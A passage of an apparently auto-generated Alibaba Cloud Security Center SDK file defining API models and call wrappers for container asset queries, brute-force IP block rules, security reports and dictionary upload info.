    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alert statistics on container assets.
 *
 * @description Only users who created a Container Registry Enterprise Edition instance can call this operation.
 *
 * @param request DescribeContainerStatisticsRequest
 * @return DescribeContainerStatisticsResponse
 */
async function describeContainerStatistics(request: DescribeContainerStatisticsRequest): DescribeContainerStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerStatisticsWithOptions(request, runtime);
}

model DescribeContainerTagsRequest {
  appName?: string(name='AppName', description='The name of the application.', example='node-exporter'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.

This parameter is required.', example='1'),
  fieldName?: string(name='FieldName', description='The name of the attribute that is used for the query. Valid values:

*   **namespace**: the namespace
*   **appName**: the application name
*   **image**: the image
*   **tag**: the tag

This parameter is required.', example='namespace'),
  fieldValue?: string(name='FieldValue', description='The value of the attribute that is used for the query.', example='demo4'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-name-01'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 200.

This parameter is required.', example='200'),
}

model DescribeContainerTagsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  tagValues?: [ string ](name='TagValues', description='An array that consists of the attributes of container assets.'),
}

model DescribeContainerTagsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeContainerTagsResponseBody(name='body'),
}

/**
 * @summary Queries the details of container assets by using an attribute.
 *
 * @param request DescribeContainerTagsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeContainerTagsResponse
 */
async function describeContainerTagsWithOptions(request: DescribeContainerTagsRequest, runtime: Util.RuntimeOptions): DescribeContainerTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of container assets by using an attribute.
 *
 * @param request DescribeContainerTagsRequest
 * @return DescribeContainerTagsResponse
 */
async function describeContainerTags(request: DescribeContainerTagsRequest): DescribeContainerTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerTagsWithOptions(request, runtime);
}

model DescribeCountNotScannedImageResponseBody = {
  notScannedCnt?: int32(name='NotScannedCnt', description='The number of images that are not scanned.', example='28'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeCountNotScannedImageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCountNotScannedImageResponseBody(name='body'),
}

/**
 * @summary Queries the number of images that are not scanned.
 *
 * @param request DescribeCountNotScannedImageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCountNotScannedImageResponse
 */
async function describeCountNotScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountNotScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountNotScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of images that are not scanned.
 *
 * @return DescribeCountNotScannedImageResponse
 */
async function describeCountNotScannedImage(): DescribeCountNotScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountNotScannedImageWithOptions(runtime);
}

model DescribeCountScannedImageResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
  scannedCount?: int32(name='ScannedCount', description='The number of images that are scanned.', example='11'),
}

model DescribeCountScannedImageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCountScannedImageResponseBody(name='body'),
}

/**
 * @summary Queries the number of images that are scanned.
 *
 * @param request DescribeCountScannedImageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCountScannedImageResponse
 */
async function describeCountScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of images that are scanned.
 *
 * @return DescribeCountScannedImageResponse
 */
async function describeCountScannedImage(): DescribeCountScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountScannedImageWithOptions(runtime);
}

model DescribeCriteriaRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset. Valid values:

*   Set the value to **ecs**, which specifies to query all Elastic Compute Service (ECS) instances.', example='ecs'),
  supportAutoTag?: boolean(name='SupportAutoTag', description='Specifies whether the keyword that you specify for fuzzy search can be automatically matched. Default value: **false**. Valid values:

*   **true**
*   **false**', example='true'),
  value?: string(name='Value', description='The keyword that you specify for fuzzy search when you query the asset.', example='47.96'),
}

model DescribeCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', description='The structured attribute values of the assets that match the keyword. The value of this parameter is in the JSON format and contains the following fields:

*   **vendor**: providers.
*   **regionIds**: IDs of supported regions', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **internetIp**: the public IP address.
*   **intranetIp**: the private IP address.
*   **instanceName**: the name of the instance.
*   **instanceId**: the instance ID.
*   **vpcInstanceId**: the ID of the virtual private cloud (VPC) to which the instance belongs.
*   **osName**: the operating system.
*   **osType**: the operating system type.
*   **hcStatus**: indicates whether baseline risks exist.
*   **vulStatus**: indicates whether vulnerabilities exist.
*   **alarmStatus**: indicates whether security alerts exist.
*   **riskStatus**: indicates whether risks exist.
*   **clientStatus**: indicates the status of the client.
*   **runningStatus**: the running status of the asset.
*   **tagName**: the name of the tag.
*   **groupName**: the name of the server group.
*   **regionId**: the region ID.
*   **importance**: the importance of the asset.
*   **exposedStatus**: indicates whether the server is exposed.
*   **authVersion**: the authorization version.
*   **flag**: the cloud service provider.
*   **ipList**: the IP addresses.
*   **uuidList** :the UUID.
*   **tagKeyValue**: the ECS tag.', example='internetIp'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The attribute values of the assets that match the keyword.', example='47.96.XX.XX'),
    }
  ](name='CriteriaList', description='The information about the search conditions of assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8E6DDACF-99AF-5939-AFFD-FCCD3B01E724'),
}

model DescribeCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries the filter conditions that are used to search for assets in fuzzy match mode.
 *
 * @param request DescribeCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCriteriaResponse
 */
async function describeCriteriaWithOptions(request: DescribeCriteriaRequest, runtime: Util.RuntimeOptions): DescribeCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.supportAutoTag)) {
    query['SupportAutoTag'] = request.supportAutoTag;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the filter conditions that are used to search for assets in fuzzy match mode.
 *
 * @param request DescribeCriteriaRequest
 * @return DescribeCriteriaResponse
 */
async function describeCriteria(request: DescribeCriteriaRequest): DescribeCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCriteriaWithOptions(request, runtime);
}

model DescribeCustomBlockInstancesRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to specify in the rule.

>  You can call the [DescribeCustomBlockRecords](~~DescribeCustomBlockRecords~~) operation to obtain the IP address.', example='47.92.33.1xx'),
  bound?: string(name='Bound', description='The traffic direction that you want to specify in the custom rule. Valid values:

*   **in**: inbound
*   **out**: outbound', example='in'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='8'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', description='Specifies whether the rule is enabled for the server.

*   **2**: enabling failed
*   **1**: enabled
*   **0**: disabled', example='1'),
}

model DescribeCustomBlockInstancesResponseBody = {
  instanceList?: [ 
    {
      aliNetOnline?: boolean(name='AliNetOnline', description='The status of the host network extension. Valid values:

*   **true**: online
*   **false**: offline', example='true'),
      blockType?: string(name='BlockType', description='The blocking type. Valid values:

*   **group**: security group
*   **alinet**: host network extension', example='group'),
      errorCode?: string(name='ErrorCode', description='The error code returned.', example='AliNetNotOnline'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='myInstance'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='116.62.121.1xx'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.1.xx'),
      status?: int32(name='Status', description='Indicates whether the rule is enabled for the server.

*   **2**: enabling failed
*   **1**: enabled
*   **0**: disabled', example='1'),
      successInfo?: string(name='SuccessInfo', description='The information that is returned after brute-force attacks are blocked.', example='{"aliUid":*******,"groupId":"sg-xxxx","groupName":"Sas_Malicious_Ip_Security_Group","groupType":"normal","instanceId":"i-xxxx","regionId":"cn-shenzhen","vpcId":"vpc-xxxxxxxx"}'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='f2d6e901-1004-4ca8-9dae-53ec04a9****'),
    }
  ](name='InstanceList', description='The server ID.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of servers to which the defense rule is applied.', example='83'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
}

model DescribeCustomBlockInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCustomBlockInstancesResponseBody(name='body'),
}

/**
 * @summary Queries the list of servers on which the custom defense rule against brute-force attacks takes effect.
 *
 * @param request DescribeCustomBlockInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCustomBlockInstancesResponse
 */
async function describeCustomBlockInstancesWithOptions(request: DescribeCustomBlockInstancesRequest, runtime: Util.RuntimeOptions): DescribeCustomBlockInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomBlockInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the list of servers on which the custom defense rule against brute-force attacks takes effect.
 *
 * @param request DescribeCustomBlockInstancesRequest
 * @return DescribeCustomBlockInstancesResponse
 */
async function describeCustomBlockInstances(request: DescribeCustomBlockInstancesRequest): DescribeCustomBlockInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomBlockInstancesWithOptions(request, runtime);
}

model DescribeCustomBlockRecordsRequest {
  blockIp?: string(name='BlockIp', description='The IP address that you want to block by using the defense rule.', example='117.66.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1'),
}

model DescribeCustomBlockRecordsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='708'),
  }(name='PageInfo', description='The pagination information.'),
  recordList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate', description='The timestamp generated when the block action on the IP address becomes invalid.', example='1671506882063'),
      blockIp?: string(name='BlockIp', description='The blocked IP address.', example='45.227.XX.XX'),
      bound?: string(name='Bound', description='The direction of the traffic that is sent by the blocked IP address. Valid values:

*   **in**
*   **out**', example='in'),
      enableCount?: int32(name='EnableCount', description='The number of servers for which the defense rule is enabled.', example='4'),
      id?: long(name='Id', description='The record ID.', example='353376'),
      serverCount?: int32(name='ServerCount', description='The total number of servers on which the IP address is blocked.', example='6'),
      source?: string(name='Source', description='The source of the defense rule.', example='UserRule'),
      status?: int32(name='Status', description='The status of the defense rule against brute-force attacks. Valid values:

*   **0**: invalid.
*   **1**: enabled.
*   **2**: failed.', example='1'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The ID of the destination asset.', example='032b618f-b220-4a0d-bd37-fbdc6*******'),
          targetType?: string(name='TargetType', description='The type of the query. Valid values:

*   Set the value to **uuid**.', example='uuid'),
        }
      ](name='TargetList', description='The servers for which the defense rule is enabled.'),
    }
  ](name='RecordList', description='An array that consists of the defense rules.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6B7T8Y'),
}

model DescribeCustomBlockRecordsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCustomBlockRecordsResponseBody(name='body'),
}

/**
 * @summary Queries the defense rules against brute-force attacks that are applied to one or more servers.
 *
 * @param request DescribeCustomBlockRecordsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCustomBlockRecordsResponse
 */
async function describeCustomBlockRecordsWithOptions(request: DescribeCustomBlockRecordsRequest, runtime: Util.RuntimeOptions): DescribeCustomBlockRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomBlockRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the defense rules against brute-force attacks that are applied to one or more servers.
 *
 * @param request DescribeCustomBlockRecordsRequest
 * @return DescribeCustomBlockRecordsResponse
 */
async function describeCustomBlockRecords(request: DescribeCustomBlockRecordsRequest): DescribeCustomBlockRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomBlockRecordsWithOptions(request, runtime);
}

model DescribeCustomizeReportConfigDetailRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reportId?: long(name='ReportId', description='The ID of the report.\\\\
You can call the [DescribeCustomizeReportList](https://help.aliyun.com/document_detail/271655.html) operation to query the ID.

This parameter is required.', example='619031'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='202.104.XXX.XXX'),
}

model DescribeCustomizeReportConfigDetailResponseBody = {
  chartIds?: string(name='ChartIds', description='The ID of the chart that is included in the report. Multiple IDs are separated by commas (,).', example='BIZ_STAT_QUERY_KEY_ATTACK,CUSTOM_VUL_CVE_LIST,CUSTOM_VUL_SYS_LIST,CUSTOM_VUL_WEBCMS_LIST,CUSTOM_AUTO_BREAKING_PIE,CUSTOM_AK_LEAK_LIST,KEY_HP_TAMPERPROOF,KEY_HP_DEFENCE'),
  groupType?: string(name='GroupType', description='The grouping type. Valid values:

*   **ALIYUN_RG**
*   **SAS_GROUP**', example='SAS_GROUP'),
  isDefault?: int32(name='IsDefault', description='Indicates whether the report is the default report. Valid values:

*   **0**: no.
*   **1**: yes.', example='1'),
  pinnedTime?: long(name='PinnedTime', description='The time when the report is pinned.', example='1717430400000'),
  recipients?: string(name='Recipients', description='The email address of the recipient. Multiple email addresses are separated by commas (,).', example='PengZheng@eaton.com,ZhongJi@Eaton.com'),
  reportDays?: int32(name='ReportDays', description='The most recent days for report statistics.', example='30'),
  reportEndDate?: string(name='ReportEndDate', description='The end date on which the report is sent.', example='1720022399999'),
  reportId?: long(name='ReportId', description='The ID of the report.', example='663434'),
  reportLang?: string(name='ReportLang', description='The language of the report. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reportSendType?: string(name='ReportSendType', description='The time range in which the report is sent. Valid values:

*   **1**: 00:00 to 06:00.
*   **2**: 06:00 to 12:00.
*   **3**: 12:00 to 18:00.
*   **4**: 18:00 to 24:00.', example='2'),
  reportStartDate?: string(name='ReportStartDate', description='The start date on which the report is sent.', example='1717430400000'),
  reportStatus?: string(name='ReportStatus', description='The status of the report. Valid values:

*   **0**: disabled.
*   **1**: enabled.', example='1'),
  reportType?: string(name='ReportType', description='The type of the report. Valid values:

*   **0**: daily report.
*   **1**: weekly report.
*   **2**: monthly report.
*   **3**: report whose statistics are collected in a custom time range.', example='3'),
  requestId?: string(name='RequestId', description='The request ID.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  sendEndTime?: string(name='SendEndTime', description='The end time at which the report is sent. The value is in the HH:mm:ss format.', example='10:00:00'),
  sendPeriodDays?: int32(name='SendPeriodDays', description='The exact day within the sending period.', example='12'),
  sendPeriodType?: string(name='SendPeriodType', description='The interval at which the report is sent. Valid values:

*   **DAY**
*   **WEEK**
*   **MONTH**', example='MONTH'),
  sendStartTime?: string(name='SendStartTime', description='The start time at which the report is sent. The value is in the HH:mm:ss format.', example='09:00:00'),
  sendTime?: string(name='SendTime', description='The time at which the report is sent. The value is in the HH:mm:ss format.', example='09:00:00'),
  targetGroups?: string(name='TargetGroups', description='The groups.', example='12125884,12140191'),
  targetUids?: string(name='TargetUids', description='The ID of the Alibaba Cloud account. Multiple IDs are separated by commas (,).', example='1457515594445744,1600011353839072,1766185894104675,1674080148055995,1627510829033157'),
  title?: string(name='Title', description='The title of the report.', example='marketing report'),
}

model DescribeCustomizeReportConfigDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCustomizeReportConfigDetailResponseBody(name='body'),
}

/**
 * @summary Obtains the configurations of a security report.
 *
 * @param request DescribeCustomizeReportConfigDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCustomizeReportConfigDetailResponse
 */
async function describeCustomizeReportConfigDetailWithOptions(request: DescribeCustomizeReportConfigDetailRequest, runtime: Util.RuntimeOptions): DescribeCustomizeReportConfigDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reportId)) {
    query['ReportId'] = request.reportId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomizeReportConfigDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the configurations of a security report.
 *
 * @param request DescribeCustomizeReportConfigDetailRequest
 * @return DescribeCustomizeReportConfigDetailResponse
 */
async function describeCustomizeReportConfigDetail(request: DescribeCustomizeReportConfigDetailRequest): DescribeCustomizeReportConfigDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomizeReportConfigDetailWithOptions(request, runtime);
}

model DescribeCustomizeReportListRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pinned?: boolean(name='Pinned', description='Specifies whether to pin the report. Valid values:

*   **false**
*   **true**', example='false'),
  reportStatus?: int32(name='ReportStatus', description='The state of the report. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
  reportType?: int32(name='ReportType', description='The type of the report. Valid values:

*   **0**: daily report
*   **1**: weekly report
*   **2**: monthly report
*   **3**: report whose statistics are collected in a custom time range', example='0'),
  reportVersion?: string(name='ReportVersion', description='The report version. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  title?: string(name='Title', description='The name of the report.', example='test'),
}

model DescribeCustomizeReportListResponseBody = {
  reportList?: [ 
    {
      isDefault?: string(name='IsDefault', description='Indicates whether the report is the default report. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      pinnedTime?: long(name='PinnedTime', description='The timestamp when the report is pinned. Unit: milliseconds.', example='1721836800000'),
      reportDays?: int32(name='ReportDays', description='The most recent days for report statistics.', example='7'),
      reportEndDate?: long(name='ReportEndDate', description='The end date on which the report is sent. The value is a UNIX timestamp. Unit: milliseconds.', example='1721923199999'),
      reportId?: long(name='ReportId', description='The ID of the report.', example='1'),
      reportStartDate?: long(name='ReportStartDate', description='The start date on which the report is sent. The value is a UNIX timestamp. Unit: milliseconds.', example='1721836800000'),
      reportStatus?: string(name='ReportStatus', description='The state of the report. Valid values:

*   **0**: disabled
*   **1**: enabled', example='0'),
      reportType?: int32(name='ReportType', description='The type of the report. Valid values:

*   **0**: daily report
*   **1**: weekly report
*   **2**: monthly report
*   **3**: report whose statistics are collected in a custom time range', example='0'),
      reportVersion?: string(name='ReportVersion', description='The report version.', example='2.0.0'),
      title?: string(name='Title', description='The name of the report.', example='test'),
    }
  ](name='ReportList', description='The reports.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DescribeCustomizeReportListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCustomizeReportListResponseBody(name='body'),
}

/**
 * @summary Queries security reports.
 *
 * @param request DescribeCustomizeReportListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCustomizeReportListResponse
 */
async function describeCustomizeReportListWithOptions(request: DescribeCustomizeReportListRequest, runtime: Util.RuntimeOptions): DescribeCustomizeReportListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pinned)) {
    query['Pinned'] = request.pinned;
  }
  if (!Util.isUnset(request.reportStatus)) {
    query['ReportStatus'] = request.reportStatus;
  }
  if (!Util.isUnset(request.reportType)) {
    query['ReportType'] = request.reportType;
  }
  if (!Util.isUnset(request.reportVersion)) {
    query['ReportVersion'] = request.reportVersion;
  }
  if (!Util.isUnset(request.title)) {
    query['Title'] = request.title;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomizeReportList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries security reports.
 *
 * @param request DescribeCustomizeReportListRequest
 * @return DescribeCustomizeReportListResponse
 */
async function describeCustomizeReportList(request: DescribeCustomizeReportListRequest): DescribeCustomizeReportListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomizeReportListWithOptions(request, runtime);
}

model DescribeCustomizedDictUploadInfoRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address.', example='106.11.43.***'),
}

model DescribeCustomizedDictUploadInfoResponseBody = {
  accessid?: string(name='Accessid', description='The AccessKey ID that is required to access the OSS object.', example='LTAI4G1mgPbjvG********'),
  expire?: string(name='Expire', description='The time when the OSS signature expires. This value is a UNIX timestamp.', example='1719921470'),
  host?: string(name='Host', description='The OSS endpoint.', example='https://aegis-update-static-file.oss-cn-hangzhou.aliyuncs.com'),
  key?: string(name='Key', description='The key of the OSS object.', example='HC_CUSTOMIZED_DICT/176618589410****.tmp'),
  policy?: string(name='Policy', description='The policy of the OSS bucket.', example='eyJleHBpcmF0aW9uIjoiMjAyNC0wNy0wMlQxMTo1Nzo1MC44MzJaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsNDA5NjBdLFsiZXEiLCIka2V5IiwiSENfQ1VTVE9NSVpFRF9ESUNUXC8xNzY2MTg1ODk0MTA0Njc1LnRtc****'),
  requestId?: string(name='RequestId', description='The request ID.', example='BDEDEEE7-AC25-559E-8C12-5168B139****'),
  securityToken?: string(name='SecurityToken'),
  signature?: string(name='Signature', description='The OSS signature.', example='mWGRgn0CtdbVf8UuJbTXOmo2****'),
}

model DescribeCustomizedDictUploadInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCustomizedDictUploadInfoResponseBody(name='body'),
}

/**
 * @summary Queries the Object Storage Service (OSS) information of the file that is uploaded to create custom weak password rules.
 *
 * @param request DescribeCustomizedDictUploadInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
